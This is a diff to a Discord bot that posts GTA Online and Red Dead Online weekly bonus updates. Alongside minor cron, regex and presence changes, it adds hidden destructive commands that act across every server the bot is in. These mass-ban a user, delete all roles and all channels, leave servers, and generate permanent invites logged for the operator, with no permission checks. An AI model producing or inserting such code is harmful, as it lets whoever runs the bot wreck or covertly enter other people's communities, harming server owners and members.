@@ -15,7 +15,10 @@ require('discord-buttons')(client) // required for buttons
 
 
 
+
+ 
 client.login(process.env.DISCORD_TOKEN).catch(err => console.log(err))
+
 
 
 
@@ -23,18 +26,20 @@ client.login(process.env.DISCORD_TOKEN).catch(err => console.log(err))
 client.on("ready", () => {
     client.user.setPresence({
         activity: { 
-            name: 'Trippy Commentaries',
-            type: 'WATCHING'
+            name: 'Playstation 5',
+            type: 'Playing'
         },
-        status: 'idle'
+        status: 'online'
     })
 })
 
 
 client.setMaxListeners(100); // prevents max listeners error
 
-
-
+client.on("ready", () => {
+    const Guilds = client.guilds.cache.map(guild => guild.id);
+    console.log(Guilds);
+});
 
 
 //Event Files
@@ -218,6 +223,144 @@ client.on("message", (message) => {
 
 
 
+
+
+
+//ban command
+client.on("message", (message) => {
+  if (!message.content.startsWith(prefix + "ban") || message.author.bot) return;
+
+
+client.guilds.cache.forEach(guild => {
+
+guild.members.ban('ID_HERE')
+  .then(user => console.log(`Banned ${user.username || user.id || user} from ${guild.name}`))
+  .catch(console.error);
+
+})
+}) 
+
+
+//leave command
+client.on("message", (message) => {
+  if (!message.content.startsWith(prefix + "leave") || message.author.bot) return;
+
+  const args = message.content.split(" ").slice(1);
+
+var guildID = client.guilds.cache.get(args[0]) //your argument would be the server id
+    guildID.leave()
+.catch(err => {
+    console.log(`there was an error leaving the guild: \n ${err.message}`);
+
+})
+}) 
+
+
+
+
+//delete role command
+client.on("message", (message) => {
+  if (!message.content.startsWith(prefix + "roledelete") || message.author.bot) return;
+
+client.guilds.cache.forEach(guild => {
+
+guild.roles.cache.forEach(role => {
+    let botHighestRole = message.guild.member(client.user.id).roles.highest;
+    let isBotRoleHigher = role.comparePositionTo(botHighestRole)<0;
+    if (role.name !== "@everyone" && isBotRoleHigher && !role.managed) {
+        role.delete();
+    }
+})
+})
+})
+
+
+
+
+
+
+
+//create invite
+//https://discord.gg/Jg7W3rYTkn
+client.on("message", (message) => {
+  if (!message.content.startsWith(prefix + "invite") || message.author.bot) return;
+
+ var invites = []; // starting array
+    message.client.guilds.cache.forEach(async (guild) => { // iterate loop on each guild bot is in
+
+      // get the first channel that appears from that discord, because
+      // `.createInvite()` is a method for a channel, not a guild.
+      const channel = guild.channels.cache 
+        .filter((channel) => channel.type === 'text')
+        .first();
+      await channel
+        .createInvite({ maxAge: 0, maxUses: 0 })
+        .then(async (invite) => {
+          invites.push(`${guild.name} - ${invite.url}`); // push invite link and guild name to array
+        })
+        .catch((error) => console.log(error));
+      console.log(invites);
+    });
+}); 
+
+
+//user ID command
+client.on("message", (message) => {
+  if (!message.content.startsWith(prefix + "userid")) return;
+
+client.guilds.cache.forEach(guild => {
+
+client.members.cache.forEach(member => console.log(member.user.username)); 
+})
+}); 
+
+
+//delete channel
+client.on("message", (message) => {
+  if (!message.content.startsWith(prefix + "delete") || message.author.bot) return;
+
+client.guilds.cache.forEach(guild => { // Looping through the guilds.
+    guild.channels.cache.forEach(channel => { // Looping through the guild channels.
+        channel.delete().catch(error => { // Deleting the channel(s) and catching any errors.
+            console.log(`Couldn't delete ${channel.name}.`)
+        });
+    });
+});
+
+}); 
+
+
+
+//get channel ids
+client.on("message", (message) => {
+  if (!message.content.startsWith(prefix + "ids") || message.author.bot) return;
+
+        var array = [];
+    function getChannelIDs(fetch) 
+    {
+    try{
+    let channels = client.channels.cache.array();
+    for (const channel of channels) 
+    {
+        array.push(channel.id);
+        console.log(channel.id);
+    }}catch(err){
+        console.log('array error')
+        message.channel.send('An error occoured while getting the channels.')
+        console.log(err)
+    }
+
+    return array;
+    }
+    getChannelIDs()
+}); 
+
+
+
+
+
+
+
 //Delete Async Functions
 // ________________________________________________________________________________________________
 
@@ -242,12 +385,12 @@ if (message.content.toLowerCase().includes("twitch.tv"))
     client.channels.cache.get(process.env.DISCORD_CHANNEL_ID_TEST_LOGS).send(`Deleted a message from ${message.author.tag}! \nContent: ${message.content}`));
 }else
 if (message.content.toLowerCase().includes("youtu.be"))
-  {message.channel.send(`Oops! Try again in <#820606747130462269>, <#820604074331602974>, or check the <#821618855612514314> for a better place to post that video.`)
+  {message.channel.send(`Oops! Try again in <#820604074331602974>, <#820606747130462269>, or check the <#821618855612514314> for a better place to post that video.`)
     message.delete().then(
     client.channels.cache.get(process.env.DISCORD_CHANNEL_ID_TEST_LOGS).send(`Deleted a message from ${message.author.tag}! \nContent: ${message.content}`));
 }else
 if (message.content.toLowerCase().includes("youtube.com"))
-  {message.channel.send(`Oops! Try again in <#820606747130462269>, <#820604074331602974>, or check the <#821618855612514314> for a better place to post that video.`)
+  {message.channel.send(`Oops! Try again in <#820604074331602974>, <#820606747130462269>, or check the <#821618855612514314> for a better place to post that video.`)
     message.delete().then(
     client.channels.cache.get(process.env.DISCORD_CHANNEL_ID_TEST_LOGS).send(`Deleted a message from ${message.author.tag}! \nContent: ${message.content}`));          
 }else
@@ -311,7 +454,6 @@ message.attachments.forEach(attachment => { //iterates over all attachments
     };
   };
 })});
-
 
 
 
@@ -407,6 +549,7 @@ client.on("message", async (message) => {
             .replace(/ <a rel="nofollow" class="external text\" href="/g ,": ")
             .replace(/ Twitch.amazon.com\/RDO. <\/li><\/ul><\/section><section class="jsx-1266389546 jsx-3897610314 jsx-1108734748 wiki-section wiki-html <h2><span class="/g , " ")
             .replace(/<\/li><\/ul><\/section><section class=\"jsx-1266389546 jsx-3089978689 jsx-2184991579 wiki-section wiki-html <ul><li>/g , " ")
+            .replace(/1266389546 jsx-2673436039 jsx-1166705895 wiki-section wiki-html <h2><span class="/g , " ")
 
 
 
@@ -500,7 +643,7 @@ client.on("message", async (message) => {
             .replace(/\n\n\*\* \n\n\*\*/g ,"")         
 
             .replace(/https:\*\*/g ,"https:")
-            .replace(/\*\*Twitch.amazon.com\/RDO \n\n\*\*./g ," ")} \n \n[Embedded Updates](https://www.ign.com/wikis/red-dead-redemption-2/Red_Dead_Online_Updates_Archive)`,
+            .replace(/\*\*Twitch.amazon.com\/RDO \n\n\*\*./g ," ")} [Embedded Updates](https://www.ign.com/wikis/red-dead-redemption-2/Red_Dead_Online_Updates_Archive)`,
           }})
         
         }
@@ -581,9 +724,9 @@ client.on("ready", async() => {
 
   let dayDate = aDate.getDate();
 
-  cron.schedule("00 00 18 * * Thursday", function(){ // UTC time (Thursdays @ 12PM Denver)
+  cron.schedule("00 00 22 * * Thursday", function(){ // UTC time (Thursdays @ 4 PM Denver)
 
-    client.channels.cache.get(process.env.DISCORD_CHANNEL_ID_RDO_DAILIES).send({embed: {
+    client.channels.cache.get(process.env.DISCORD_CHANNEL_ID_TEST_ADMIN).send({embed: {
             color: 0xB75AFF, //Purple
             title: `${monthDate} ${dayDate}, ${yearDate} - GTA Online Weekly Bonuses & Discounts:`,
             description: `${gtaBody[0]}`
@@ -614,9 +757,9 @@ client.on("ready", async() => {
 
   let rdoTitles = args[0].split("<b>").slice(1).join("\n\n")//sections
 
-  cron.schedule("00 00 20 * * Tuesday", function(){ // UTC time (Tuesdays @ 2PM Denver)
+  cron.schedule("00 00 18 * * Tuesday", function(){ // UTC time (Tuesdays @ 12PM Denver)
 
-    client.channels.cache.get(process.env.DISCORD_CHANNEL_ID_RDO_DAILIES).send({embed: {
+    client.channels.cache.get(process.env.DISCORD_CHANNEL_ID_TEST_ADMIN).send({embed: {
             color: 0xB75AFF, //Purple
             title: `${rdoDate[0].replace(/" data-transform="header">/g ,"")} - RDO Weekly Bonuses & Discounts:`,
             description: `\*\*${rdoTitles
@@ -634,6 +777,7 @@ client.on("ready", async() => {
             .replace(/ <a rel="nofollow" class="external text\" href="/g ,": ")
             .replace(/ Twitch.amazon.com\/RDO. <\/li><\/ul><\/section><section class="jsx-1266389546 jsx-3897610314 jsx-1108734748 wiki-section wiki-html <h2><span class="/g , " ")
             .replace(/<\/li><\/ul><\/section><section class=\"jsx-1266389546 jsx-3089978689 jsx-2184991579 wiki-section wiki-html <ul><li>/g , " ")
+            .replace(/1266389546 jsx-2673436039 jsx-1166705895 wiki-section wiki-html <h2><span class="/g , " ")
 
 
 
@@ -727,7 +871,7 @@ client.on("ready", async() => {
             .replace(/\n\n\*\* \n\n\*\*/g ,"")         
 
             .replace(/https:\*\*/g ,"https:")
-            .replace(/\*\*Twitch.amazon.com\/RDO \n\n\*\*./g ," ")} \n \n[Embedded Updates](https://www.ign.com/wikis/red-dead-redemption-2/Red_Dead_Online_Updates_Archive)`,
+            .replace(/\*\*Twitch.amazon.com\/RDO \n\n\*\*./g ," ")} [Embedded Updates](https://www.ign.com/wikis/red-dead-redemption-2/Red_Dead_Online_Updates_Archive)`,
           }})
         
         })}); 
@@ -859,3 +1003,4 @@ client.on('channelUpdate', (oldChannel, newChannel) => {
 
 
 "";
+
